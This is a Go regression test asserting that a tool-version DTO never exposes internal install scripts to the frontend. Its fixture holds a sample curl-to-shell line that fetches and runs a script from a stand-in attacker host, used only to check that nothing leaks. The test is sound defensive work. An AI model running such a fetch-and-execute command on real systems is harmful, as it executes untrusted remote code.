package handler

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/web-casa/webcasa/internal/versioncheck"
)

// TestToolVersionDTO_OmitsInstallScripts is the regression lock for the
// "frontend can never render what the API never sends" guarantee: the
// client-facing DTO must never carry install_scripts, even when the internal
// manifest model is populated with them.
func TestToolVersionDTO_OmitsInstallScripts(t *testing.T) {
	internal := &versioncheck.ToolVersion{
		Recommended: "1.2.3",
		Minimum:     "1.0.0",
		InstallScripts: map[string]string{
			"linux": "curl evil.example.com/install.sh | sh",
		},
	}

	dto := toolVersionToDTO(internal)

	out, err := json.Marshal(dto)
	if err != nil {
		t.Fatalf("marshal DTO: %v", err)
	}

	body := string(out)
	if strings.Contains(body, "install_scripts") {
		t.Fatalf("client-facing DTO must not contain install_scripts key; got %s", body)
	}
	if strings.Contains(body, "evil.example.com") || strings.Contains(body, "install.sh") {
		t.Fatalf("client-facing DTO leaked install script contents; got %s", body)
	}
	if dto.Recommended != "1.2.3" || dto.Minimum != "1.0.0" {
		t.Fatalf("DTO dropped safe version fields: %+v", dto)
	}
}
